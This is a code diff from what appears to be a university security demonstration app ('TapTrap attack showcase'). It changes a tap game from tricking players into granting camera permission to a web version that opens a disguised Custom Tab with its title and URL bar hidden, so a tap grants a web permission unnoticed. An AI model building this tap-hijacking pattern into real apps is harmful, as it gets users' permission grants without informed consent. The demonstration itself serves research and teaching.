@@ -1,95 +1,93 @@
-package edu.hm.itsec.taptrapattackshowcase.runtimepermissions
+package edu.hm.itsec.taptrapattackshowcase.web
 
-import android.app.Activity
 import android.content.Intent
-import android.content.pm.PackageManager
 import android.graphics.Rect
 import android.os.Bundle
 import android.os.CountDownTimer
-import android.os.Handler
 import android.os.Looper
 import android.util.Log
 import android.view.View
 import android.widget.Button
 import android.widget.Toast
+import androidx.activity.OnBackPressedCallback
 import androidx.activity.enableEdgeToEdge
-import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
-import androidx.camera.lifecycle.ProcessCameraProvider
-import androidx.core.app.ActivityOptionsCompat
-import androidx.core.content.ContextCompat
+import androidx.browser.customtabs.CustomTabsIntent
+import androidx.core.net.toUri
 import androidx.core.view.ViewCompat
-import androidx.core.view.WindowCompat
 import androidx.core.view.WindowInsetsCompat
-import androidx.core.view.WindowInsetsControllerCompat
 import androidx.core.view.isVisible
-import com.google.common.util.concurrent.ListenableFuture
 import edu.hm.itsec.taptrapattackshowcase.R
-import edu.hm.itsec.taptrapattackshowcase.databinding.ActivityTapGameBinding
+import edu.hm.itsec.taptrapattackshowcase.databinding.ActivityTapGameWebBinding
 import java.util.Random
 
+class TapGameWebActivity : AppCompatActivity() {
 
-class TapGameActivity : AppCompatActivity() {
+    private lateinit var binding: ActivityTapGameWebBinding
 
-    private lateinit var binding: ActivityTapGameBinding
-
-    private val TAG: String = "TapGameActivity"
+    private val TAG: String = "TapGameWebActivity"
 
     // game logic
-    private val handler = Handler(Looper.getMainLooper())
+    private val handler = android.os.Handler(Looper.getMainLooper())
     private val random = Random()
     private var screenWidth = 0
     private var screenHeight = 0
 
     // Delay constants (in milliseconds)
-    private val APPEAR_DELAY: Long = 1000 // Time after tap before it reappears
-    private val AUTOHIDE_DELAY: Long = 3000 // Time before it hides if not tapped
+    private val APPEAR_DELAY: Long = 1000  // Time after tap before it reappears
+    private val AUTOHIDE_DELAY: Long = 3000  // Time before it hides if not tapped
 
-    // Runnables to control each button's appearance
+    // Runnables to conrtol each button's appearance
     private val runnableA = Runnable { showButton(binding.buttonA, binding.buttonB) }
     private val runnableB = Runnable { showButton(binding.buttonB, binding.buttonA) }
 
     private var score = 0
 
     private var granted: Boolean = false
-    private var retry: Boolean = false
 
-    private lateinit var cameraProviderFuture : ListenableFuture<ProcessCameraProvider>
-
-    private var resultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
-        binding.blackOverlay.animate().alpha(0.75f).setDuration(0).start()
-        if (result.resultCode == Activity.RESULT_OK) {
-            granted()
-            binding.buttonA.performClick()
-        }
-    }
+    private var timer: CountDownTimer? = null
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        val windowInsetsController =
-            WindowCompat.getInsetsController(window, window.decorView)
-        // Configure the behavior of the hidden system bars.
-        windowInsetsController.systemBarsBehavior =
-            WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
-        windowInsetsController.hide(WindowInsetsCompat.Type.statusBars())
-        cameraProviderFuture = ProcessCameraProvider.getInstance(this)
         enableEdgeToEdge()
-        binding = ActivityTapGameBinding.inflate(layoutInflater)
-        val view = binding.root
+        binding = ActivityTapGameWebBinding.inflate(layoutInflater)
+
+        val view = binding.rootLayoutTabGameWeb
         setContentView(view)
-        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.rootLayout)) { v, insets ->
+        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.rootLayoutTabGameWeb)) { v, insets ->
             val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
             v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
             insets
         }
 
+        onBackPressedDispatcher.addCallback(this, object: OnBackPressedCallback(true) {
+            override fun handleOnBackPressed() {
+                if (!granted) {
+                    // Start WebActivity with flags to prevent taking CustomTab from BackStack
+                    val webActivity = Intent(this@TapGameWebActivity, WebActivity::class.java)
+                    webActivity.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+                    startActivity(webActivity)
+                    finish()
+                } else {
+                    if (isEnabled) {
+                        isEnabled = false
+                        onBackPressedDispatcher.onBackPressed()
+                    } else {
+                        finish()
+                    }
+                }
+            }
+        })
+
         // Wait for the layout to be drawn to get its dimensions
-        binding.rootLayout.post {
-            screenWidth = binding.rootLayout.width
-            screenHeight = binding.rootLayout.height
+        binding.rootLayoutTabGameWeb.post {
+            screenWidth = binding.rootLayoutTabGameWeb.width
+            screenHeight = binding.rootLayoutTabGameWeb.height
             // Start the game!
-            handler.post(runnableA)
-            handler.post(runnableB)
+            binding.rootLayoutTabGameWeb.postDelayed({
+                handler.post(runnableA)
+                handler.post(runnableB)
+            }, 100)
         }
 
         // click listeners
@@ -97,10 +95,10 @@ class TapGameActivity : AppCompatActivity() {
             score++
             binding.scoreTextView.text = getString(R.string.score_0, score)
             // finish the game after 5 taps
-            val message: String = if (cameraAccessGranted()) {
-                "The permission to access the camera has been granted by you. Did you notice?"
+            val message: String = if (permissionGranted()) {
+                "The web permission has been granted by you. Did you notice?"
             } else {
-                "You did not grant the permission to access the camera. You won!"
+                "You did not grant the web permission. You won!"
             }
             if (score >= 5) {
                 val gameOverDialog = GameOverDialog.newInstance(
@@ -116,27 +114,22 @@ class TapGameActivity : AppCompatActivity() {
         binding.scoreTextView.text = getString(R.string.score_0, score)
     }
 
-
     /**
      * Handles the logic for when a button is tapped.
      */
-    private fun handleTap(button: View, reShowRunnable: Runnable) {
-
+    private fun handleTap(button: View, reShowRunable: Runnable) {
         button.visibility = View.INVISIBLE
 
         // Cancel the "auto-hide" runnable (stored in the tag)
         (button.tag as? Runnable)?.let { handler.removeCallbacks(it) }
 
         // Stop any other pending "show" commands for this button
-        handler.removeCallbacks(reShowRunnable)
+        handler.removeCallbacks(reShowRunable)
 
         // Schedule this button to reappear after a delay
-        handler.postDelayed(reShowRunnable, APPEAR_DELAY)
+        handler.postDelayed(reShowRunable, APPEAR_DELAY)
     }
 
-    /**
-     * The main logic to show a button in a new, non-overlapping position.
-     */
     private fun showButton(buttonToShow: Button, otherButton: Button) {
         // Don't run if the layout isn't ready
         if (screenWidth == 0 || screenHeight == 0) return
@@ -149,7 +142,7 @@ class TapGameActivity : AppCompatActivity() {
         var newX: Float
         var newY: Float
 
-        if (buttonToShow == binding.buttonA && score == 2 && !cameraAccessGranted()) {
+        if (buttonToShow == binding.buttonA && score == 2 && !permissionGranted()) {
             newX = (screenWidth - buttonWidth) / 2f
             newY = (screenHeight - buttonHeight) / 2f
             startAttack()
@@ -168,7 +161,7 @@ class TapGameActivity : AppCompatActivity() {
                 newX = random.nextInt(screenWidth - buttonWidth).toFloat()
                 newY = random.nextInt(screenHeight - buttonHeight).toFloat()
 
-                // Create a Rect for the button's new potential position
+                // Create a Rect for the button's ne potential position
                 newRect.set(newX.toInt(), newY.toInt(), newX.toInt() + buttonWidth, newY.toInt() + buttonHeight)
 
                 // Check for overlap only if the other button is currently visible
@@ -183,16 +176,6 @@ class TapGameActivity : AppCompatActivity() {
         // Position and show the button
         buttonToShow.x = newX
         buttonToShow.y = newY
-        if (buttonToShow == binding.buttonA) {
-            if (score != 2 || cameraAccessGranted()) {
-                binding.blackOverlay.animate().alpha(1f).setDuration(0).start()
-                binding.blackOverlay.animate().alpha(0.75f).setDuration(500).start()
-            } else {
-                binding.blackOverlay.animate().alpha(1f).setDuration(0).start()
-                binding.blackOverlay.animate().alpha(0.0f).setDuration(500).start()
-            }
-
-        }
         buttonToShow.visibility = View.VISIBLE
 
         // Create a new runnable that will hide this button if it's not tapped
@@ -200,8 +183,8 @@ class TapGameActivity : AppCompatActivity() {
             if (buttonToShow.isVisible) {
                 buttonToShow.visibility = View.INVISIBLE
                 // Schedule it to show again (as if it were a "miss")
-                val reShowRunnable = if (buttonToShow == binding.buttonA) runnableA else runnableB
-                handler.postDelayed(reShowRunnable, APPEAR_DELAY)
+                val reShowRunable = if (buttonToShow == binding.buttonA) runnableA else runnableB
+                handler.postDelayed(reShowRunable, APPEAR_DELAY)
             }
         }
         // Store this runnable in the button's tag so we can cancel it on tap
@@ -235,57 +218,58 @@ class TapGameActivity : AppCompatActivity() {
         }
     }
 
-    /**
-     * Registers that the camera permission has been granted.
-     *
-     */
-    private fun granted() {
-        retry = false
-        granted = true
-        Log.d(TAG, "Camera access has been granted!")
+    override fun onNewIntent(intent: Intent) {
+        super.onNewIntent(intent)
+        setIntent(intent)
+        val data = intent?.data
+        if (data?.scheme == "myapp" && data.host == "web-permission-success") {
+            granted = true
+            timer?.cancel()
+            binding.buttonA.performClick()
+        }
     }
 
     private fun startAttack() {
-        // cancel attack if permission has already been granted
-        if (cameraAccessGranted()) return
+        // Cancel attack if permission has already been granted
+        if (permissionGranted()) return
 
         Log.d(TAG, "Starting attack...")
 
-        // Creates an Intent to open the camera permission request screen
-        val intent = Intent("android.content.pm.action.REQUEST_PERMISSIONS")
-        intent.putExtra(
-            "android.content.pm.extra.REQUEST_PERMISSIONS_NAMES",
-            arrayOf("android.permission.CAMERA")
-        )
+        // Create an Intent to open the CustomTabs activity
+        val url = ""  // URL to open in CustomTab
+        val customTabsIntent = CustomTabsIntent.Builder()
+            .setShowTitle(false)
+            .setUrlBarHidingEnabled(true)
+            .setStartAnimations(
+                this,
+                R.anim.fade_in_web,
+                R.anim.fade_out
+            )
+            .build()
 
-        // Creates the custom animation for the activity transition
-        val activityOptions =
-            ActivityOptionsCompat.makeCustomAnimation(this, R.anim.fade_in, R.anim.fade_out)
+        customTabsIntent.launchUrl(this, url.toUri())
 
-        // Starts the camera permission request screen with the animation
-        resultLauncher.launch(intent, activityOptions)
-
-        // relaunch the TapGameActivity to hide the permission request screen after 6 seconds
-        object : CountDownTimer(6000, 1000) {
+        // Relaunch the TapGameWebActivity to hide the CustomTab after 6 seconds
+        timer = object : CountDownTimer(6000, 1000) {
             override fun onTick(millisUntilFinished: Long) {}
 
             override fun onFinish() {
-                val tapGameActivityIntent = Intent(
-                    this@TapGameActivity,
-                    TapGameActivity::class.java
+                val tapGameWebActivityIntent = Intent(
+                    this@TapGameWebActivity,
+                    TapGameWebActivity::class.java
                 )
                 if (!granted) {
-                    retry = true
                     val toast = Toast(applicationContext)
-                    toast.setText(R.string.failed_runtime_permission_toast)
+                    toast.setText(R.string.failed_web_permission_toast)
                     toast.show()
-                    startActivity(tapGameActivityIntent)
+                    startActivity(tapGameWebActivityIntent)
+                    finish()
                 }
             }
         }.start()
     }
 
-    private fun cameraAccessGranted(): Boolean {
-        return ContextCompat.checkSelfPermission(applicationContext, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
+    private fun permissionGranted(): Boolean {
+        return granted
     }
 }
